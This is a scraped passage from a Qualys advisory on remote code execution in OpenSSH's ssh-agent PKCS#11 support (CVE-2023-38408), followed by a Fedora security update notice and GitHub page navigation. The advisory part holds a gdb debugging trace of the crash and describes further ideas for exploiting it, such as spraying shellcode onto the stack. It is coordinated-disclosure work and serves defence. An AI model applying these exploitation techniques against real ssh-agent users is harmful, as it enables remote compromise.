- LLVM's _Unwind_GetCFA() then calls its unw_get_reg() function (at line
  57303), which in turn calls a function pointer (at line 57311) that is
  a member of LLVM's struct _Unwind_Context, but that happens to be a
  stack pointer in GCC's struct _Unwind_Context;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3635541
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffcf5e9be10 in ?? ()

(gdb) !grep stack /proc/3635541/maps
7ffcf5e82000-7ffcf5ea3000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
57295      0x00007f7c8eaaccf1:  call   0x7f7c8ea99470 <_Unwind_GetCFA@plt>

57296      0x00007f7c8ea99470 <_Unwind_GetCFA@...+0>:   endbr64
57297      0x00007f7c8ea99474 <_Unwind_GetCFA@...+4>:   bnd jmp *0x1bc2d(%rip)        # 0x7f7c8eab50a8 <_Unwind_GetCFA@....plt>

57298      0x00007f7c8edce920 <_Unwind_GetCFA+0>:       sub    $0x18,%rsp
57299      0x00007f7c8edce924 <_Unwind_GetCFA+4>:       mov    %fs:0x28,%rax
57300      0x00007f7c8edce92d <_Unwind_GetCFA+13>:      mov    %rax,0x10(%rsp)
57301      0x00007f7c8edce932 <_Unwind_GetCFA+18>:      lea    0x8(%rsp),%rdx
57302      0x00007f7c8edce937 <_Unwind_GetCFA+23>:      mov    $0xfffffffe,%esi
57303      0x00007f7c8edce93c <_Unwind_GetCFA+28>:      call   0x7f7c8edca6b0 <unw_get_reg>

57304      0x00007f7c8edca6b0 <unw_get_reg+0>:  push   %rbp
57305      0x00007f7c8edca6b1 <unw_get_reg+1>:  push   %r14
57306      0x00007f7c8edca6b3 <unw_get_reg+3>:  push   %rbx
57307      0x00007f7c8edca6b4 <unw_get_reg+4>:  mov    %rdx,%r14
57308      0x00007f7c8edca6b7 <unw_get_reg+7>:  mov    %esi,%ebp
57309      0x00007f7c8edca6b9 <unw_get_reg+9>:  mov    %rdi,%rbx
57310      0x00007f7c8edca6bc <unw_get_reg+12>: mov    (%rdi),%rax
57311      0x00007f7c8edca6bf <unw_get_reg+15>: call   *0x10(%rax)

(gdb) !grep 7f7c8ea /proc/3635541/maps
7f7c8ea99000-7f7c8eab0000 r-xp 00003000 08:03 8788336                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1

(gdb) !grep 7f7c8ed /proc/3635541/maps
7f7c8edc9000-7f7c8edd1000 r-xp 00000000 08:03 11148811                   /usr/lib/llvm-14/lib/libunwind.so.1.0
------------------------------------------------------------------------

========================================================================
RCE in library constructor
========================================================================

As a last and extreme example of a remote attack against ssh-agent
forwarding, we noticed that one shared library's constructor function
(which can be invoked by a remote attacker via an ssh-agent forwarding)
starts a server thread that listens on a TCP port, and we discovered a
remotely exploitable vulnerability (a heap-based buffer overflow) in
this server's implementation.

The unusual malloc exploitation technique that we used to remotely
exploit this vulnerability is so interesting (it is reliable, one-shot,
and works against the latest glibc versions, despite all the modern
protections) that we decided to publish it in a separate advisory:

    <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fwww.qualys.com%2F2023%2F06%2F06%2Frenderdoc%2Frenderdoc.txt&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=nofBS%2FHzMRkvCgf%2FnCVxTNk7qQdAy84QcWuVMsaxPl4%3D&reserved=0><<https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt>>

This last and extreme attack vector against ssh-agent also underlines
the central point of this advisory: many shared libraries are simply not
safe to be loaded (and unloaded) in a security-sensitive program such as
ssh-agent.

========================================================================
Discussion
========================================================================

We believe that we have not exploited the full potential of this
"dlopen() then dlclose()" primitive:

- we have only investigated Ubuntu Desktop 22.04 and 21.10, but other
  versions, distributions, or operating systems might be hiding further
  surprises;

- our rudimentary fuzzer can certainly be greatly improved, and has
  definitely not tried all the combinations of shared libraries and side
  effects;

- we have identified seven attack vectors against ssh-agent (described
  in the "Results" section), but we have not analyzed in detail all the
  results of our fuzzer;

- we have not fully explored various aspects of these attack vectors:

  - it might be possible to reliably exploit the "Sigaltstack
    use-after-free" (by carefully overwriting the .data or .bss segment
    of a shared library) or the "Sigreturn to arbitrary instruction
    pointer" (by partially overwriting a leftover pointer in
    ssh-pkcs11-helper's stack);

  - we currently store our shellcode in ssh-pkcs11-helper's main() stack
    buffer only, but it might be possible to store shellcode in other
    stack buffers as well, or somehow spray the stack with shellcode,
    which would dramatically increase our chances of jumping into our
    shellcode;

    for example, we tried to spray the stack with shellcode by
    interrupting a memcpy() of controlled data with a signal handler,
    thereby spilling controlled YMM registers to the stack (inspired by
    <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D2266&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=mYENYDFpftGaac%2B5%2BGJcg%2FAKFVZhh%2BIyb6TLmRaMsfI%3D&reserved=0>)<<https://bugs.chromium.org/p/project-zero/issues/detail?id=2266>>, but
    we failed because we can memcpy() only ~10KB of data, and because we
    cannot remotely use tricks such as inotify or sched*() to precisely
    time this race;

  - it might be possible to control the mmap layout of ssh-pkcs11-helper
    with page precision (which would allow us to precisely control the
    gadget that replaces the unmapped signal handler, callback function,
    or return from syscall), but we failed to find large malloc()ations
    (which are mmap()ed) in ssh-pkcs11-helper (the only way we found to
    influence the mmap layout is to load and unload shared libraries, as
    mentioned in Step 4a/ of the "Experiments" section);

  - instead of replacing the unmapped signal handler or callback
    function (or return from syscall) with a gadget from another shared
    library, it is perfectly possible to replace it with an executable
    thread stack (made executable by loading an "execstack" library),
    but we have failed so far to control the contents of such a thread
    stack.

========================================================================
Acknowledgments
========================================================================

We thank the OpenSSH developers, and Damien Miller in particular, for
their outstanding work on this vulnerability and on OpenSSH in general.
We also thank Mitre's CVE Assignment Team for their quick response.
Finally, we dedicate this advisory to the Midnight Fox.

========================================================================
Timeline
========================================================================

2023-07-06: We sent a draft of our advisory and a preliminary patch to
the OpenSSH developers.

2023-07-07: The OpenSSH developers replied and sent us a more complete
set of patches.

2023-07-09: We sent feedback about these patches to the OpenSSH
developers.

2023-07-11: The OpenSSH developers sent us a complete set of patches,
and we sent them feedback about these patches.

2023-07-14: The OpenSSH developers informed us that "we're aiming to
make a security-only release ... on July 19th."

2023-07-19: Coordinated release.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from lists.fedoraproject.org_fb027744_20250110_133627.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/RAXVQS6ZYTULFAK3TEJHRLKZALJS3AOU/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/RAXVQS6ZYTULFAK3TEJHRLKZALJS3AOU/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/RAXVQS6ZYTULFAK3TEJHRLKZALJS3AOU/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/RAXVQS6ZYTULFAK3TEJHRLKZALJS3AOU/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-RAXVQS6ZYTULFAK3TEJHRLKZALJS3AOU.mbox.gz?message=RAXVQS6ZYTULFAK3TEJHRLKZALJS3AOU "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/RAXVQS6ZYTULFAK3TEJHRLKZALJS3AOU/#RAXVQS6ZYTULFAK3TEJHRLKZALJS3AOU)

# [SECURITY] Fedora 38 Update: openssh-9.0p1-16.fc38

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

23 Jul
2023

23 Jul
'23

4:30 a.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2023-878e04f4ae
2023-07-23 01:27:02.654081
--------------------------------------------------------------------------------

Name : openssh
Product : Fedora 38
Version : 9.0p1
Release : 16.fc38
URL : <http://www.openssh.com/portable.html>
Summary : An open source implementation of SSH protocol version 2
Description :
SSH (Secure SHell) is a program for logging into and executing
commands on a remote machine. SSH is intended to replace rlogin and
rsh, and to provide secure encrypted communications between two
untrusted hosts over an insecure network. X11 connections and
arbitrary TCP/IP ports can also be forwarded over the secure channel.

OpenSSH is OpenBSD's version of the last free version of SSH, bringing
it up to date in terms of security and features.

This package includes the core files necessary for both the OpenSSH
client and server. To make this package useful, you should also
install openssh-clients, openssh-server, or both.

--------------------------------------------------------------------------------
Update Information:

Security fix for CVE-2023-38408
--------------------------------------------------------------------------------
ChangeLog:

\* Fri Jul 21 2023 Dmitry Belyavskiy dbelyavs@redhat.com - 9.0p1-16
- Fix remote code execution in ssh-agent PKCS#11 support
Resolves: CVE-2023-38408
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2224173 - CVE-2023-38408 openssh: Remote code execution in ssh-agent PKCS#11 support
<https://bugzilla.redhat.com/show_bug.cgi?id=2224173>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2023-878e04f4ae' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/RAXVQS6ZYTULFAK3TEJHRLKZALJS3AOU/#RAXVQS6ZYTULFAK3TEJHRLKZALJS3AOU)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from github.com_0655d67b_20250110_133626.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopenbsd%2Fsrc%2Fcommit%2Ff8f5a6b003981bb824329dc987d101977beda7ca)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
